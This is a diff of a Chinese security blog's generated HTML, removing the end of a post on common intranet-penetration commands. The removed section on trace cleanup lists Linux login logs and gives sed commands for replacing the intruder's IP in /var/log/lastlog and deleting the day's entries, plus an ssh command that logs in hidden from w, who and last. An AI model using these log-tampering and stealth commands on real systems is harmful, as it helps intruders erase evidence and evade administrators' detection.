-<h2 id="ssh-登录信息"><a href="#ssh-登录信息" class="headerlink" title="ssh 登录信息"></a>ssh 登录信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/var/log/btmp   记录所有登录失败信息，使用 lastb 命令查看</span><br><span class="line">/var/log/lastlog    记录系统中所有用户最后一次登录时间日志，使用 lastlog 命令查看</span><br><span class="line">/var/log/wtmp   记录所有用户的登录，注销信息，使用last命令查看</span><br><span class="line">/var/log/utmp   记录当前已经登录的用户信息，使用w,who,users等命令查看</span><br><span class="line">/var/log/secure 记录与安全相关的日志信息</span><br><span class="line">/var/log/message 记录系统启动后的信息和错误日志</span><br><span class="line"></span><br><span class="line">登录ssh时显示的上次登录记录</span><br><span class="line">last login 时间 fromn ip</span><br><span class="line"></span><br><span class="line">记录在文件 /var/log/lastlog   ~/.ssh/known_hosts</span><br><span class="line">可以使用sed替换</span><br><span class="line">sed -i &#x27;s/自己ip/原ip&#x27; /var/log/lastlog</span><br><span class="line"></span><br><span class="line">sed -i &#x27;/当天日期/&#x27;d filename</span><br><span class="line"></span><br><span class="line">隐身登录系统，不会被 w,who,last 等指令检测到</span><br><span class="line">ssh -T root@192.168.01 /bin/bash -i</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>祝老板天天开心<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="/img/alipay.jpg">
-                      <span class="reward-type">支付宝</span>
-                    </div>
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
+        <div class="article-info info-on-right">
+          
+          
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/IntranetPenetration//" class="article-tag-list-link color5">IntranetPenetration</a>
+        			<a href="/categories/ctf//" class="article-tag-list-link color4">ctf</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/10/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
   
   
-    <a href="/2021/09/18/New-blog/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">新博客新气象</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-        <div class="toc-container tooltip-left">
-            <i class="icon-font icon-category"></i>
-            <div class="tooltip tooltip-east">
-                <span class="tooltip-item">
-                </span>
-                <span class="tooltip-content">
-                    <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%9F%A5%E6%89%BE"><span class="toc-number">2.</span> <span class="toc-text">文件查找</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WMI"><span class="toc-number">3.</span> <span class="toc-text">WMI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IPC"><span class="toc-number">4.</span> <span class="toc-text">IPC</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">5.</span> <span class="toc-text">计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AT-Schtasks"><span class="toc-number">5.1.</span> <span class="toc-text">AT&#x2F;Schtasks</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">6.</span> <span class="toc-text">端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Netsh%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">6.1.</span> <span class="toc-text">Netsh端口转发</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSH%E8%BD%AC%E5%8F%91"><span class="toc-number">7.</span> <span class="toc-text">SSH转发</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E9%97%A8"><span class="toc-number">8.</span> <span class="toc-text">后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.1.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.2.</span> <span class="toc-text">白银票据</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">9.</span> <span class="toc-text">工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dsquery"><span class="toc-number">9.1.</span> <span class="toc-text">dsquery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADfind"><span class="toc-number">9.2.</span> <span class="toc-text">ADfind</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#psexec-paexec"><span class="toc-number">9.3.</span> <span class="toc-text">psexec paexec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#winrm"><span class="toc-number">9.4.</span> <span class="toc-text">winrm</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-number">10.</span> <span class="toc-text">痕迹清理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#wevtutil"><span class="toc-number">10.1.</span> <span class="toc-text">wevtutil</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-defender"><span class="toc-number">10.2.</span> <span class="toc-text">windows defender</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-number">10.3.</span> <span class="toc-text">ssh 登录信息</span></a></li></ol></li></ol>
-                    </div>
-                </span>
-            </div>
-        </div>
-        
-    </div>
-</aside>
-
-
-
+    </div></section>
   
 
-  
-
-  
-  <div id="SOHUCS" sid="内网渗透常用命令" ></div> 
-<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
-<script type="text/javascript">
-    window.changyan.api.config({
-        appid: "true",
-        conf: "true"
-    });
-</script>
-</script>
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -426,10 +253,10 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
 		isTag: false,
-		isCategory: false,
+		isCategory: true,
 		open_in_new: false,
 		toc_hide_index: true,
 		root: "/",
